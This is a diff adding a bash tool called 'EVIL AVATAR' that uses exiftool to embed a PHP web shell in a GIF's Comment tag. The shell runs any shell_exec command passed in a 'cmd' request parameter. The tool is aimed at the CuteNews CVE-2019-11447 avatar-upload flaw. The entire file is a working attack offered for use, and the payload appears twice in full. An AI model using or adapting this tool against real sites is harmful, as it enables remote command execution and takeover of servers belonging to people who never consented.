@@ -1,0 +1,55 @@
+#!/bin/bash
+
+############ IMPORTANT!!! THIS IS THE GOOD ONE COMMAND!! ##########################################################################################################
+# ORIGINAL PAYLOAD !
+# exiftool -Comment="<?php echo \"\n\ndGhpc3dlYnNoZWxsb3V0cHV0c3RhcnRzaGVyZQ==\n\n\n\"; echo shell_exec(\$_GET[\"cmd\"]); echo \"\n\ndGhpc3dlYnNoZWxsb3V0cHV0ZW5kc2hlcmU=\n\n\";?>" migif.gif
+############################################################################################################################################################
+
+filepath="/tmp/"
+
+function _USAGE(){
+	printf -- "EVIL AVATAR v0.1\n\n"
+	printf -- "Description:\n"
+	printf -- "evil-avatar is a program that inject hidden php payload in the metadata tag Comment using exiftool\n"
+	printf -- "Options:\n"
+	printf -- "-h                         Show help\n"
+	printf -- "-s                         Show Payloads\n\n"
+	printf -- "PAYLOADS\n"
+	printf -- "--cutenews                 CuteNews_CVE-2019-11447 custom payload\n\n"
+	printf -- "USAGE evil-avatar --payloadname <yourgiftoinfect>\n"
+
+}
+
+function show_payloads(){
+
+	printf -- "Show payloads:\n"
+	echo -n "--cutenews   $default_php_cutenews_two_one_two_version_payload"
+	printf -- "\n"
+}
+
+###### DEFAULT PAYLOAD ########
+default_php_cutenews_two_one_two_version_payload="<?php echo \"\n\ndGhpc3dlYnNoZWxsb3V0cHV0c3RhcnRzaGVyZQ==\n\n\n\"; echo shell_exec(\$_GET[\"cmd\"]); echo \"\n\ndGhpc3dlYnNoZWxsb3V0cHV0ZW5kc2hlcmU=\n\n\";?>"
+##############################
+
+for args in "@"
+do
+	if [ "$1" == "--cutenews" ];
+	then
+		printf -- "Default payload is set to default_php_cutenews_2.1.2_payload\n"
+		printf -- "Writing default payload in tag Comment with exiftool\n"
+		exiftool -Comment="$default_php_cutenews_two_one_two_version_payload" "$2"
+		mv "$2" "/home/$SUDO_USER/Desktop/"sad.gif
+		cp "/home/$SUDO_USER/Desktop/"sad.gif "$filepath"sad.gif
+		printf -- "File /home/$SUDO_USER/Desktop/sad.gif is ready\n"
+		printf -- "File saved in $filepath too\n"
+
+	elif [ "$1" == "-s" ];
+	then
+		show_payloads
+	else
+		_USAGE
+		exit
+	fi
+
+done
+
